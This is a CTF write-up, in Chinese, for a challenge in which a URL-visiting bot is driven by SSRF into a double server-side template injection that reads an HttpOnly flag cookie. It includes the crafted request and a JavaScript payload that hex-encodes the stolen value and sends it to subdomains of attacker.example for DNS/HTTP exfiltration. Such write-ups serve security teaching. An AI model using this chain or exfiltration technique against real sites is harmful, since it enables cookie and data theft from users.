# 梅开二度

## 题目简述

题目提供了一个会访问指定 URL 的 bot。利用链同时涉及 SSRF、两次服务端模板渲染与 HttpOnly Cookie 读取：先让 bot 访问内网页面，再把请求方法作为模板数据带入，绕过 HTML 转义后触发第二次 SSTI，最终由服务端模板读取浏览器不能直接读取的 Cookie。

## 解题过程

### 让 bot 访问内网页面

`/bot?url=...` 会让 bot 打开用户提供的地址。目标服务同时监听在 bot 可访问的 `127.0.0.1:8080`，因此把经 URL 编码的恶意 HTML 作为内网页面的参数送入。原题可用 Yakit FuzzTag 的 `{{url(...)}}` 对各层内容逐层编码。

概念化请求如下：

```http
GET /bot?url={{url(http://127.0.0.1:8080/?GET={{url(HTML_PAYLOAD)}}&tmpl={{url({{.Query .Request.Method}})}})}} HTTP/1.1
Host: target.example
```

`{{.Query .Request.Method}}` 的关键是从请求的另一个维度引入模板内容，而不是直接把它写进会被 HTML 转义的字段。

### 二次渲染读取 HttpOnly Cookie

bot 执行的 HTML 先访问 `/flag`，使题目把 flag 写入 HttpOnly Cookie。JavaScript 不能从 `document.cookie` 读取该值，但浏览器后续请求仍会自动带上 Cookie。再请求：

```text
/?tmpl={{.Cookie (.Query .Request.Method)}}&GET=flag
```

在第二次模板渲染中，`.Query .Request.Method` 从 GET 查询参数取出字符串 `flag`，`.Cookie` 再按这个名字读取请求 Cookie。因而 HttpOnly 只阻止前端 JavaScript 直接取值，无法阻止服务端模板读取已随请求送到后端的 Cookie。

恶意页面可将响应内容编码为十六进制，再分段放入受控域名的子域中：

```html
<script>
(async () => {
    await fetch('/flag');
    const response = await fetch(
        '/?tmpl={{.Cookie (.Query .Request.Method)}}&GET=flag'
    );
    const hex = [...await response.text()]
        .map(ch => ch.charCodeAt(0).toString(16).padStart(2, '0'))
        .join('');
    new Image().src = `http://${hex.slice(0, 50)}.attacker.example/collect`;
})();
</script>
```

在自己的 DNS/HTTP 日志中取回子域片段，按顺序拼接并从十六进制解码，即可恢复 flag。实际利用时应按 DNS 标签长度限制分片，并为每片加序号。

## 方法总结

- 利用链是 `SSRF 驱动 bot → 请求方法传入模板 → 二次 SSTI → 服务端读 Cookie → DNS/HTTP 外带`。
- HttpOnly 只限制 JavaScript 读 Cookie，不会阻止浏览器发送 Cookie，也不会自动修复服务端模板注入。
- 多层 URL/模板语法要从最内层向外逐层编码；外带数据要分片、编号并做定长编码，避免丢失前导零或因域名过长失败。
